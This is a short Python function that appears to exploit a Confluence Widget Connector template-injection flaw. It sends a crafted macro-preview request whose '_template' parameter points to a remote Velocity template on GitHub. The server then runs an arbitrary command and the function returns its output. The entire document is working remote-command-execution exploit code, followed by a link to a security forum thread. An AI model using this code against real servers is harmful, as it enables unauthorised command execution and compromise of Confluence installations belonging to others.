def _exec(url,cmd):
    result = {}
    filename = "https://raw.githubusercontent.com/ba0zi/confluence/master/cmd.vm"

    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"http://www.dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"%s","cmd":"%s"}}}' % (filename,cmd)
    r = requests.post(paylaod, data=data, headers=headers)
    # print r.content
    if r.status_code == 200 and "wiki-content" in r.text:
        m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)

    return m[0]
    
    
    https://www.t00ls.net/viewthread.php?tid=50686&extra=&highlight=confluence&page=1
